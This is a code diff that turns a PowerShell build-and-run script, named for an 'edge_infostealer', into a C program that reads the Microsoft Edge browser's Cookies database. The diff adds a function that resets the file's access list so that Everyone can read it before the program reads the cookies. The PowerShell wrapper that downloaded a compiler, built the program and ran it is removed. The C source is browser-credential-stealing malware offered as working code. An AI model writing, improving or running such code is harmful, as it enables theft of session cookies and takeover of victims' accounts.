@@ -1,18 +1,6 @@
-# Define the URL for w64devkit
-$w64devkitUrl = "https://github.com/skeeto/w64devkit/releases/download/v2.0.0/w64devkit-x86-2.0.0.exe"
-$w64devkitExe = "w64devkit-x86-2.0.0.exe"
-$w64devkitDir = "w64devkit"
-
-# Download w64devkit
-Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe
-
-# Run the w64devkit installer
-Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait
-
-# Define the C program
-$cProgram = @"
 #include <windows.h>
 #include <wincrypt.h>
+#include <aclapi.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -71,24 +59,58 @@ void read_cookies_file(const char *path) {
     }
 }
 
+// Function to set file permissions to allow read access
+void set_file_permissions(const char *path) {
+    DWORD result;
+    PSID pEveryoneSID = NULL;
+    PACL pACL = NULL;
+    EXPLICIT_ACCESS ea;
+    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
+
+    // Create a well-known SID for the Everyone group.
+    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
+                                  0, 0, 0, 0, 0, 0, 0, &pEveryoneSID)) {
+        printf("AllocateAndInitializeSid Error %u\n", GetLastError());
+        return;
+    }
+
+    // Initialize an EXPLICIT_ACCESS structure for an ACE.
+    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
+    ea.grfAccessPermissions = GENERIC_READ;
+    ea.grfAccessMode = SET_ACCESS;
+    ea.grfInheritance = NO_INHERITANCE;
+    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
+    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+    ea.Trustee.ptstrName = (LPTSTR)pEveryoneSID;
+
+    // Create a new ACL that contains the new ACEs.
+    result = SetEntriesInAcl(1, &ea, NULL, &pACL);
+    if (ERROR_SUCCESS != result) {
+        printf("SetEntriesInAcl Error %u\n", GetLastError());
+        if (pEveryoneSID) FreeSid(pEveryoneSID);
+        return;
+    }
+
+    // Apply the new ACL as the object's DACL.
+    result = SetNamedSecurityInfo((LPSTR)path, SE_FILE_OBJECT,
+                                  DACL_SECURITY_INFORMATION,
+                                  NULL, NULL, pACL, NULL);
+    if (ERROR_SUCCESS != result) {
+        printf("SetNamedSecurityInfo Error %u\n", GetLastError());
+    }
+
+    if (pEveryoneSID) FreeSid(pEveryoneSID);
+    if (pACL) LocalFree(pACL);
+}
+
 int main() {
     char cookies_path[MAX_PATH];
     snprintf(cookies_path, sizeof(cookies_path), "%s\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", getenv("LOCALAPPDATA"));
+
+    // Set file permissions to allow read access
+    set_file_permissions(cookies_path);
+
+    // Now attempt to read the file
     read_cookies_file(cookies_path);
     return 0;
 }
-"@
-
-# Save the C program to a file
-$cProgramPath = "edge_infostealer.c"
-Set-Content -Path $cProgramPath -Value $cProgram
-
-# Compile the C program using w64devkit
-$w64devkitBin = "C:\w64devkit\bin"
-$gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
-$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32"
-Invoke-Expression $compileCommand
-
-# Run the compiled executable
-$exePath = ".\edge_infostealer.exe"
-Invoke-Expression $exePath
